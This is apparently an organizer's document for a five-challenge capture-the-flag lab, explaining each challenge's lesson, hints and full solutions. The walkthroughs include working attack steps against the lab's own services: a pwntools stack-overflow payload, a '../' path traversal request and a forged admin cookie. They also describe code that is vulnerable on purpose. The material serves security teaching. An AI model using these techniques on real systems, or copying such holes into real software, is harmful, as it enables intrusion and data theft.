# Challenges — intent, hints, walkthroughs

What each of the five challenges teaches, where its flag lives, and how it
falls. For setup and ops see `README.md`; for the team tool shells see
`TEAM-TOOLKITS.md`.

> **Spoilers.** §2 sketches hints (the nudge a stuck player might want). §3
> contains full exploit solutions — if you're a player meant to solve these
> yourself, stop reading there. Organizers: keep §3 out of any handout you give
> players.

---

## 1. The five challenges

| Service              | Category  | Host port | Skill it teaches                         |
|----------------------|-----------|-----------|-------------------------------------------|
| `web-cookie-monster` | web       | 9001      | Trusting client-controlled data for auth  |
| `pwn-stackoverflow`  | pwn       | 9002      | Stack buffer overflow / return hijack     |
| `crypto-xor`         | crypto    | 9003      | Tiny-keyspace brute force                 |
| `forensics-hidden`   | forensics | 9004      | Data appended after a file's real EOF     |
| `web-filevault`      | web       | 9005      | Path traversal / Local File Inclusion     |

### Where the flags live

| Challenge            | Flag location                                |
|----------------------|----------------------------------------------|
| web-cookie-monster   | `app.py`, `FLAG = ...`                       |
| pwn-stackoverflow    | `PWN_FLAG` in `.env` (build-arg injected)     |
| crypto-xor           | `app.py`, `FLAG = ...` (served XOR-encoded)   |
| forensics-hidden     | `gen.py`, appended to `vacation.png`          |
| web-filevault        | `WEB_FLAG` in `.env` (build-arg injected)     |

Copy each flag into CTFd's admin UI when you create the challenge entry.
Players never see these files; they only reach the running services on ports
9001–9005.

---

## 2. Intent + hints (organizer view, player nudges)

### web-cookie-monster

A tiny Flask app reads a `role` cookie. If `role == admin`, it returns the
flag. The cookie is plain, client-set, and unsigned — so the client fully
controls it.

**Lesson:** authorization must never trust client-controlled state; real apps
use server-signed sessions.
**Hint:** open dev-tools and look at the request.

### pwn-stackoverflow

A C program reads input into a 64-byte stack buffer with `gets()`, which has no
bounds checking. There's an unused `win()` function that prints the flag.
Compiled with protections deliberately off (no stack canary, no PIE) so the
teaching point is the bug itself. Exposed over the network by `socat`, which
forks a fresh process per connection.

**Lesson:** unbounded input lets an attacker overwrite the saved return
address and redirect execution.
**Hint:** what's after the buffer on the stack? What's after that?

### crypto-xor

A Flask app XORs the flag against a single byte and serves the hex. With only
256 possible keys, brute force is instant.

**Lesson:** a key small enough to brute-force isn't encryption.
**Hint:** how many one-byte keys are there?

### forensics-hidden

A build step appends the flag *after* the end of a valid PNG file, then serves
the file. Image viewers stop at the PNG's real end and never show it; the bytes
are still in the file.

**Lesson:** "looks like an image" ≠ "contains only an image"; inspect raw
bytes.
**Hint:** an image viewer is not the only way to look at a file.

### web-filevault

A Flask "document viewer" builds a file path directly from a user-supplied
`?file=` parameter with no sanitization. The intended use reads files from a
`docs/` directory, but `../` sequences escape it and reach any file the process
can read — including the flag stored outside `docs/`.

**Lesson:** never build a filesystem path from raw user input; validate
against an allowlist or resolve and confirm the path stays inside the intended
directory.
**Hint:** the app reads files relative to `docs/`. What does `../` mean to a
filesystem?

---

## 3. Full walkthroughs (spoilers)

### 3.1 web-cookie-monster (port 9001)

The server believes whatever `role` cookie you send. Send `role=admin`:

```bash
curl -b "role=admin" http://<ip>:9001/
```

`-b` sets a request cookie. The page returns the flag. In a browser: dev-tools
→ Application → Cookies → set `role=admin` → reload.

### 3.2 crypto-xor (port 9003)

Grab the hex, then try all 256 single-byte keys until the result starts with
`CTF{`:

```bash
python3 - <<'PY'
ct = bytes.fromhex("PASTE_THE_HEX_HERE")
for k in range(256):
    pt = bytes(b ^ k for b in ct)
    if pt.startswith(b"CTF{"):
        print(k, pt.decode()); break
PY
```

### 3.3 forensics-hidden (port 9004)

Download the file and look at its raw bytes — the flag is plain text after the
image data:

```bash
curl -s http://<ip>:9004/vacation.png -o vacation.png
strings vacation.png | grep CTF     # printable runs from a binary
# or: binwalk vacation.png          # detects/extracts appended data
```

### 3.4 pwn-stackoverflow (port 9002)

The buffer is 64 bytes; after it sits the saved base pointer (8 bytes), then
the saved **return address**. Overflow past the buffer + saved pointer (72
bytes total) and overwrite the return address with the address of `win()`.

```bash
objdump -d vuln | grep '<win>:'     # e.g. 0x4011f6

python3 - <<'PY'
from pwn import *
context.arch = "amd64"
io = remote("<ip>", 9002)
payload = b"A"*72 + p64(0x4011f6)   # 72 bytes padding + little-endian win() addr
io.sendline(payload)
print(io.recvall().decode(errors="replace"))
PY
```

`p64(...)` packs the address into 8 little-endian bytes (how x86-64 stores
addresses in memory). The 72 comes from `buffer(64) + saved RBP(8)`.

### 3.5 web-filevault (port 9005)

The viewer reads whatever path you put in `?file=`. Walk up out of the `docs/`
directory with `../` to reach the flag:

```bash
curl "http://<ip>:9005/view?file=../secret/flag.txt"
```

The flag lives in `/secret/flag.txt`, one level above the app's `docs/`
directory. Depending on how many directories deep the app is, you may need
more `../` — itself a realistic part of the lesson.
